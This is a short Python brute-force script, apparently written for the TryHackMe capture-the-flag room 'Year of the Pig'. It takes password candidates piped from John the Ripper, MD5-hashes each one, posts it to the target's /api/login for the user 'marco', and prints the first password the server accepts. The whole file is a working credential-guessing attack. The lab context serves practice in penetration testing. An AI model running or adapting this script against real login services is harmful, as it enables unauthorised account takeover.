import requests, sys, json, hashlib

"""
for the TryHackMe room Year of the Pig
usage: john --wordlist=pass.txt -rules:PigRule -stdout | python3 brute.py http://yotp marco
"""

payload = {"username":sys.argv[2],"password":"test"}
print("Username: marco")

for line in sys.stdin:
    payload["password"] = hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
    r = requests.post(f"{sys.argv[1]}/api/login", data=json.dumps(payload))
    json_data = json.loads(r.content)

    if json_data["Response"] != "Error":
        print("Password:", line)
        break
